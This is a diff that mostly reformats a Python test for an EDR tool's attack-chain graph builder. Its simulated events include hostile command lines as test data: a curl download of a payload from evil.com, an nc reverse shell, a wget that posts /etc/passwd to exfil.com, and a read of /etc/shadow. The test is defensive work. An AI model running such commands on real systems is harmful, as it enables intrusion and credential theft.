@@ -10,12 +10,10 @@ Usage:
 from __future__ import annotations
 
 import json
-import os
 import shutil
 import sys
 import tempfile
-import time
-from datetime import datetime, timezone
+from datetime import UTC, datetime
 from pathlib import Path
 
 import kuzu
@@ -41,12 +39,13 @@ from agent.schema.kuzu_schema import init_graph_schema
 # ── Helpers ──────────────────────────────────────────────────────────
 
 HOSTNAME = "test-host"
-T0 = datetime(2025, 6, 15, 10, 0, 0, tzinfo=timezone.utc)
+T0 = datetime(2025, 6, 15, 10, 0, 0, tzinfo=UTC)
 
 
 def ts(offset_sec: int = 0) -> datetime:
     """Return T0 + offset."""
     from datetime import timedelta
+
     return T0 + timedelta(seconds=offset_sec)
 
 
@@ -173,12 +172,13 @@ def process_event_batch(
 
 
 def separator(title: str) -> None:
-    print(f"\n{'='*60}")
+    print(f"\n{'=' * 60}")
     print(f"  {title}")
-    print(f"{'='*60}\n")
+    print(f"{'=' * 60}\n")
 
 
 # ── Main Test ────────────────────────────────────────────────────────
+
 
 def main() -> int:
     data_dir = Path(tempfile.mkdtemp(prefix="edr_chain_test_"))
@@ -199,7 +199,7 @@ def _run_test(data_dir: Path) -> int:
     conn = kuzu.Connection(kuzu_db)
     init_graph_schema(conn)
 
-    settings = Settings(data_dir=data_dir)
+    Settings(data_dir=data_dir)  # validates data_dir structure
     queue = SqliteQueue(str(db_path))
     builder = GraphBuilder(kuzu_db)
 
@@ -216,13 +216,19 @@ def _run_test(data_dir: Path) -> int:
 
     batch1_events = [
         # zsh spawned by root
-        make_process_event(100, "zsh", ppid=1, username="root",
-                          cmdline="/bin/zsh -c './attack.sh'",
-                          create_time=ts(0), offset=0),
+        make_process_event(
+            100, "zsh", ppid=1, username="root", cmdline="/bin/zsh -c './attack.sh'", create_time=ts(0), offset=0
+        ),
         # curl spawned by zsh
-        make_process_event(200, "curl", ppid=100, username="root",
-                          cmdline="curl -o /tmp/payload.py https://evil.com/payload",
-                          create_time=ts(1), offset=1),
+        make_process_event(
+            200,
+            "curl",
+            ppid=100,
+            username="root",
+            cmdline="curl -o /tmp/payload.py https://evil.com/payload",
+            create_time=ts(1),
+            offset=1,
+        ),
         # curl DNS resolution
         make_dns_event(200, "curl", "evil.com", "93.184.216.34", offset=2),
         # curl network connection
@@ -230,21 +236,21 @@ def _run_test(data_dir: Path) -> int:
         # curl creates payload file
         make_file_event(200, "curl", "/tmp/payload.py", "file_create", offset=4),
         # python spawned by curl (executes downloaded payload)
-        make_process_event(300, "python3", ppid=200, username="root",
-                          cmdline="python3 /tmp/payload.py",
-                          create_time=ts(5), offset=5),
+        make_process_event(
+            300, "python3", ppid=200, username="root", cmdline="python3 /tmp/payload.py", create_time=ts(5), offset=5
+        ),
         # python creates a file
         make_file_event(300, "python3", "/tmp/.backdoor.sh", "file_create", offset=6),
         # nc (reverse shell) spawned by python
-        make_process_event(400, "nc", ppid=300, username="root",
-                          cmdline="nc -e /bin/sh 10.0.0.99 4444",
-                          create_time=ts(7), offset=7),
+        make_process_event(
+            400, "nc", ppid=300, username="root", cmdline="nc -e /bin/sh 10.0.0.99 4444", create_time=ts(7), offset=7
+        ),
         # nc connects to C2
         make_network_event(400, "nc", "10.0.0.99", 4444, offset=8),
     ]
 
     next_id = process_event_batch(batch1_events, queue, builder, start_event_id=1)
-    print(f"Processed {len(batch1_events)} events (event IDs 1-{next_id-1})")
+    print(f"Processed {len(batch1_events)} events (event IDs 1-{next_id - 1})")
 
     # ── Verify process chain (ancestor walk) ─────────────────────
     separator("VERIFY: Process chain (ancestor walk from nc PID 400)")
@@ -286,10 +292,10 @@ def _run_test(data_dir: Path) -> int:
         print(f"  - {child.get('name')} (PID {child.get('pid')})")
 
     if len(children) != 1 or children[0].get("pid") != 200:
-        print(f"  ERROR: Expected 1 child (curl PID 200)")
+        print("  ERROR: Expected 1 child (curl PID 200)")
         errors += 1
     else:
-        print(f"  OK: curl (PID 200) is the only child")
+        print("  OK: curl (PID 200) is the only child")
 
     # ── Verify full process tree ─────────────────────────────────
     separator("VERIFY: Full process tree from curl (PID 200)")
@@ -316,18 +322,18 @@ def _run_test(data_dir: Path) -> int:
 
         # curl should have: ancestor=zsh, child=python3, grandchild=nc
         if len(ancestors) != 1 or ancestors[0]["pid"] != 100:
-            print(f"  ERROR: Expected 1 ancestor (zsh PID 100)")
+            print("  ERROR: Expected 1 ancestor (zsh PID 100)")
             errors += 1
         if len(children_of_target) != 1 or children_of_target[0]["pid"] != 300:
-            print(f"  ERROR: Expected 1 child (python3 PID 300)")
+            print("  ERROR: Expected 1 child (python3 PID 300)")
             errors += 1
         else:
             grandchildren = children_of_target[0].get("children", [])
             if len(grandchildren) != 1 or grandchildren[0]["pid"] != 400:
-                print(f"  ERROR: Expected 1 grandchild (nc PID 400)")
+                print("  ERROR: Expected 1 grandchild (nc PID 400)")
                 errors += 1
             else:
-                print(f"  OK: Full tree structure correct")
+                print("  OK: Full tree structure correct")
 
         # Check network/file activity on target
         print(f"\nTarget network activity: {len(target.get('network', []))} items")
@@ -369,7 +375,7 @@ def _run_test(data_dir: Path) -> int:
             print(f"  ERROR: Chain names {names} != {expected_names}")
             errors += 1
         else:
-            print(f"  OK: Attack chain correct")
+            print("  OK: Attack chain correct")
 
     # ── Verify serialization ─────────────────────────────────────
     separator("VERIFY: serialize_attack_chain output")
@@ -405,15 +411,21 @@ def _run_test(data_dir: Path) -> int:
         # nc sends data to C2
         make_network_event(400, "nc", "10.0.0.99", 4444, offset=23),
         # New child of python3: wget (data exfil)
-        make_process_event(500, "wget", ppid=300, username="root",
-                          cmdline="wget --post-file=/etc/passwd https://exfil.com/drop",
-                          create_time=ts(24), offset=24),
+        make_process_event(
+            500,
+            "wget",
+            ppid=300,
+            username="root",
+            cmdline="wget --post-file=/etc/passwd https://exfil.com/drop",
+            create_time=ts(24),
+            offset=24,
+        ),
         make_dns_event(500, "wget", "exfil.com", "198.51.100.1", offset=25),
         make_network_event(500, "wget", "198.51.100.1", 443, offset=26),
     ]
 
     next_id = process_event_batch(batch2_events, queue, builder, start_event_id=next_id)
-    print(f"Processed {len(batch2_events)} more events (event IDs up to {next_id-1})")
+    print(f"Processed {len(batch2_events)} more events (event IDs up to {next_id - 1})")
 
     # ── Verify updated tree after batch 2 ────────────────────────
     separator("VERIFY: Updated tree after batch 2")
@@ -434,7 +446,7 @@ def _run_test(data_dir: Path) -> int:
                     print(f"      Network: {item}")
 
         if len(curl_children) != 1:
-            print(f"  ERROR: curl should have 1 direct child (python3)")
+            print("  ERROR: curl should have 1 direct child (python3)")
             errors += 1
         else:
             python_node = curl_children[0]
@@ -444,7 +456,7 @@ def _run_test(data_dir: Path) -> int:
                 print(f"  ERROR: python3 should have children nc(400) + wget(500), got {python_child_pids}")
                 errors += 1
             else:
-                print(f"  OK: python3 now has 2 children (nc + wget)")
+                print("  OK: python3 now has 2 children (nc + wget)")
 
             # Check python3's new network activity
             python_network = python_node.get("network", [])
@@ -464,7 +476,7 @@ def _run_test(data_dir: Path) -> int:
     child_procs2 = attack_chain2["child_processes"]
     print(f"python3 child_processes: {len(child_procs2)}")
     for cp in child_procs2:
-        print(f"  - {cp['name']} (PID {cp['pid']}) cmd=\"{cp.get('cmd_line', '')}\"")
+        print(f'  - {cp["name"]} (PID {cp["pid"]}) cmd="{cp.get("cmd_line", "")}"')
         for net in cp.get("network", []):
             print(f"    Network: {net}")
 
@@ -473,7 +485,7 @@ def _run_test(data_dir: Path) -> int:
         print(f"  ERROR: Expected children {{400, 500}}, got {child_pids2}")
         errors += 1
     else:
-        print(f"  OK: Attack chain includes both nc and wget as children")
+        print("  OK: Attack chain includes both nc and wget as children")
 
     # ── Updated serialization ────────────────────────────────────
     separator("VERIFY: Updated serialized chain for python3")
@@ -499,9 +511,7 @@ def _run_test(data_dir: Path) -> int:
     separator("BATCH 3: nc spawns sh (interactive shell)")
 
     batch3_events = [
-        make_process_event(600, "sh", ppid=400, username="root",
-                          cmdline="/bin/sh -i",
-                          create_time=ts(30), offset=30),
+        make_process_event(600, "sh", ppid=400, username="root", cmdline="/bin/sh -i", create_time=ts(30), offset=30),
         make_file_event(600, "sh", "/etc/shadow", "file_read", offset=31),
         make_network_event(600, "sh", "10.0.0.99", 4445, offset=32),
     ]
@@ -531,7 +541,7 @@ def _run_test(data_dir: Path) -> int:
             print(f"  ERROR: Expected PIDs {expected_pids}, got {actual_pids}")
             errors += 1
         else:
-            print(f"  OK: Full 5-level chain correct")
+            print("  OK: Full 5-level chain correct")
 
     # ── Final: Full tree from root (zsh) ─────────────────────────
     separator("FINAL: Complete tree from root zsh (PID 100)")
@@ -541,6 +551,7 @@ def _run_test(data_dir: Path) -> int:
         print("  ERROR: get_process_tree returned None for root!")
         errors += 1
     else:
+
         def count_tree_nodes(node: dict) -> int:
             count = 1
             for child in node.get("children", []):
@@ -554,7 +565,7 @@ def _run_test(data_dir: Path) -> int:
             print(f"  ERROR: Expected 6 processes total, got {total}")
             errors += 1
         else:
-            print(f"  OK: All 6 processes in the tree")
+            print("  OK: All 6 processes in the tree")
 
         # Print final tree
         def print_tree(node: dict, indent: int = 0) -> None:
